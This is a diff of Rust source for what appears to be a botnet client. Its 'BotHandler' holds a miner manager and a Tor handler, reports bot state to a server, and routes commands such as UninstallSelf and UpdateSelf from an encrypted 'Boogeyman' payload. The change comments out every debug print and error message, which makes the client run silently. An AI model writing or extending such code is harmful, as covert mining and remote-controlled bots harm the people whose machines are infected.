@@ -43,17 +43,17 @@ pub struct BotHandler {
 
 impl BotHandler {
     pub async fn new(miner_ref: Arc<RwLock<MinerManager>>) -> Result<Self> {
-        println!("making tor handler");
+        // println!("making tor handler");
         let tor_handler = TrHandler::new().await?;
-        println!("generate_bot_state");
+        // println!("generate_bot_state");
 
         let bot_state = generate_bot_state().await;
-        println!("Terminal");
+        // println!("Terminal");
 
         let terminal = match Terminal::new() {
             Ok(terminal) => { Some(Arc::new(Mutex::new(terminal))) }
             Err(error) => {
-                eprintln!("error getting terminal: {}", error);
+                // eprintln!("error getting terminal: {}", error);
                 None
             }
         };
@@ -83,13 +83,13 @@ impl BotHandler {
             {
                 if let Err(error) = Self::process_data(decrypted_data, self_ref).await {
                     //? HONESTLY THIS ERROR VERY IMPORTANT WE SHOULD REPORT IT TO SERVER VIA DEFAULT ERROR type
-                    eprintln!("Failed to process data via callback: {}", error);
+                    // eprintln!("Failed to process data via callback: {}", error);
                 };
             }
         });
     }
     fn connect_callback_init(self_ref: RwPtr<Self>) {
-        println!("connect callback");
+        // println!("connect callback");
         tokio::task::spawn(async move {
             let self_guard = self_ref.read().await;
             let params = InitParams { bot_state: self_guard.bot_state.read().await.clone() };
@@ -101,7 +101,7 @@ impl BotHandler {
                     ServerParams::Init(params)
                 ).await
             {
-                eprintln!("Failed to send data: {}", error);
+                // eprintln!("Failed to send data: {}", error);
             }
         });
     }
@@ -118,7 +118,7 @@ impl BotHandler {
         processed_data: BoogeymanReceivePayload,
         self_ref: RwPtr<Self>
     ) -> Result<()> {
-        println!("routing data: {:#?}", processed_data);
+        // println!("routing data: {:#?}", processed_data);
         match processed_data.action {
             receive::ClientAction::UninstallSelf => {}
             receive::ClientAction::UpdateSelf => {}
